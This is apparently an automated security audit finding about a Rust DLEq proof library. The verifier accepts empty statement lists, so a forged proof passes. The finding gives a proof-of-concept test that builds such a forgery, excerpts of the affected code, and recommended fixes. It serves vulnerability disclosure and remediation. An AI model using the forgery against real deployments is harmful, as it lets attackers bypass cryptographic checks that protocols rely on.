### Title
Empty DLEq statements bypass proof verification - (File: `crypto/dleq/src/lib.rs`) [1](#0-0) 

### Summary
Medium severity: `DLEqProof::verify` accepts a proof when `generators` and `points` are both empty because it only checks that their lengths are equal, performs no verification statements, and then accepts any supplied `c` matching the deterministic transcript challenge. [2](#0-1) 

### Finding Description
The verifier’s guardrail is the equality check at `generators.len() != points.len()`, but it does not reject a zero-length statement set. [3](#0-2)  With no statements, the `zip` loop never calls `verify_statement`, meaning `s` is never incorporated into the Fiat–Shamir transcript or checked against any group equation. [4](#0-3)  An attacker can therefore serialize only the expected challenge as `c` followed by any canonical scalar as `s`; `DLEqProof::read` accepts that pair as a proof. [5](#0-4) 

### Impact Explanation
This permits a forged DLEq proof to verify without proving knowledge of any discrete logarithm or equality relation. [1](#0-0)  Any caller that accepts a dynamically supplied statement list can have its DLEq validation bypassed entirely. [6](#0-5) 

### Likelihood Explanation
`DLEqProof::read` is a public parser for untrusted proof bytes, and the forgery only requires reproducing the public transcript challenge plus choosing an arbitrary `s`. [7](#0-6)  The existing test suite itself exercises `i = 0`, confirming that an empty statement list reaches the verifier rather than being rejected by construction. [8](#0-7) 

### Recommendation
Reject empty statement sets in `DLEqProof::prove` and `DLEqProof::verify`; for DLEq semantics, require at least two generator/point pairs. [6](#0-5)  Apply the same non-empty validation to `MultiDLEqProof`, including its outer discrete-log list and each inner generator/point list. [9](#0-8)  Add regression tests proving both zero-statement `DLEqProof` and `MultiDLEqProof` inputs fail. [10](#0-9) 

### Proof of Concept
The following crate-local test derives the public verification challenge, encodes it with an arbitrary `s`, parses it through the public untrusted-byte API, and obtains `Ok(())` despite proving no statements. [7](#0-6) 

```rust
// crypto/dleq/src/tests/mod.rs
use transcript::RecommendedTranscript;
use k256::{Scalar, ProjectivePoint};
use ff::PrimeField;
use crate::{challenge, DLEqProof};

#[test]
fn forged_empty_dleq_proof() {
  let mut forged_transcript = RecommendedTranscript::new(b"DLEq Proof Test");
  forged_transcript.domain_separate(b"dleq");
  let c: Scalar = challenge(&mut forged_transcript);

  let mut encoded = Vec::new();
  encoded.extend(c.to_repr().as_ref());
  encoded.extend(Scalar::ZERO.to_repr().as_ref()); // Arbitrary: unused for zero statements.

  let proof =
    DLEqProof::<ProjectivePoint>::read::<&[u8]>(&mut encoded.as_slice()).unwrap();

  proof
    .verify(&mut RecommendedTranscript::new(b"DLEq Proof Test"), &[], &[])
    .unwrap();
}
```

```rust
// Produce a non-biased challenge from the transcript in the specified field
pub(crate) fn challenge<T: Transcript, F: PrimeField>(transcript: &mut T) -> F {
  // From here, there are three ways to get a scalar under the ff/group API
  // 1: Scalar::random(ChaCha20Rng::from_seed(self.transcript.rng_seed(b"challenge")))
  // 2: Grabbing a UInt library to perform reduction by the modulus, then determining endianness
  //    and loading it in
  // 3: Iterating over each byte and manually doubling/adding. This is simplest

  let mut challenge = F::ZERO;

  // Get a wide amount of bytes to safely reduce without bias
  // In most cases, <=1.5x bytes is enough. 2x is still standard and there's some theoretical
  // groups which may technically require more than 1.5x bytes for this to work as intended
  let target_bytes = usize::try_from(F::NUM_BITS).unwrap().div_ceil(8) * 2;
  let mut challenge_bytes = transcript.challenge(b"challenge");
  let challenge_bytes_len = challenge_bytes.as_ref().len();
  // If the challenge is 32 bytes, and we need 64, we need two challenges
  let needed_challenges = target_bytes.div_ceil(challenge_bytes_len);
```

```rust
  /// Prove that the points created by `scalar * G`, for each specified generator, share a discrete
  /// logarithm.
  pub fn prove<R: RngCore + CryptoRng, T: Transcript>(
    rng: &mut R,
    transcript: &mut T,
    generators: &[G],
    scalar: &Zeroizing<G::Scalar>,
  ) -> DLEqProof<G> {
    let r = Zeroizing::new(G::Scalar::random(rng));

    transcript.domain_separate(b"dleq");
    for generator in generators {
      // R, A
      Self::transcript(transcript, *generator, *generator * r.deref(), *generator * scalar.deref());
    }

    let c = challenge(transcript);
    // r + ca
    let s = (c * scalar.deref()) + r.deref();

    DLEqProof { c, s }
  }
```

```rust
  /// Verify the specified points share a discrete logarithm across the specified generators.
  pub fn verify<T: Transcript>(
    &self,
    transcript: &mut T,
    generators: &[G],
    points: &[G],
  ) -> Result<(), DLEqError> {
    if generators.len() != points.len() {
      Err(DLEqError::InvalidProof)?;
    }

    transcript.domain_separate(b"dleq");
    for (generator, point) in generators.iter().zip(points) {
      Self::verify_statement(transcript, *generator, *point, self.c, self.s);
    }

    if self.c != challenge(transcript) {
      Err(DLEqError::InvalidProof)?;
    }

    Ok(())
```
